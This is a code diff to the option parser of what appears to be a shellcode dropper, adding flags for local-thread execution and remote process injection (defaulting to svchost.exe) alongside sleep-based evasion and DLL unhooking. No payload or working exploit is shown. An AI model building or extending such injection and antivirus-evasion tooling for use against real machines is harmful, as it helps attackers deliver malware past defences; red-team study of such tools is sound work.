@@ -114,8 +114,12 @@ def main():
     source_group.add_argument('-sf', '--source-bin-file', help="Source file from which the shellcode should be loaded.  This is expected to be a raw file.")
     source_group.add_argument('-ss', '--source-hex-string', help="Hex string from which the payload should be provisioned. Ex: \\x90\\x65\\x23...")
 
-    parser.add_argument('--sleep-evasion', default=0, type=int, help="Sleeps for x seconds when the program is initially launched.")
+    parser.add_argument('-lte', '--local-thread-execution', default=False, action='store_true', help="Run the shellcode in the dropper process.")
+
+    parser.add_argument('-ri', '--remote-inject', default=False, action='store_true', help="If injecting in a remote process, this indicates the process to inject the shellcode into.")
     parser.add_argument('--remote-inject-executable', default="C:\\Windows\\System32\\svchost.exe", help="If injecting in a remote process, this indicates the process to inject the shellcode into.")
+
+    parser.add_argument('--sleep-evasion', default=0, type=int, help="Sleeps for x seconds when the program is initially launched.")
     parser.add_argument('--unhook-dll', action='append', help="Unhooks the indicated DLLs at runtime (C:\\Windows\\System32\\ntdll.dll).")
 
     args = parser.parse_args()
@@ -133,6 +137,10 @@ def main():
     if args.verbose:
         print("Shellcode: {}".format(shellcode))
         print("Length of the shellcode: {}".format(len(shellcode)))
+
+    if (args.remote_inject and not args.remote_inject_executable):
+        print("Error: the remote-inject and remote-inject-executable options need to be provided together!")
+        sys.exit(-4)
 
     # Acquires the encryption key from one of the given sources.
     key = None
@@ -164,7 +172,8 @@ def main():
     if args.sleep_evasion > 0:
         code_config["sleep_evasion"] = args.sleep_evasion
 
-    if args.remote_inject_executable:
+    if args.local_thread_execution and args.remote_inject_executable:
+        code_config["local_thread_execution"] = args.local_thread_execution
         code_config["remote_inject_executable"] = args.remote_inject_executable
 
     if args.unhook_dll and len(args.unhook_dll) > 0:
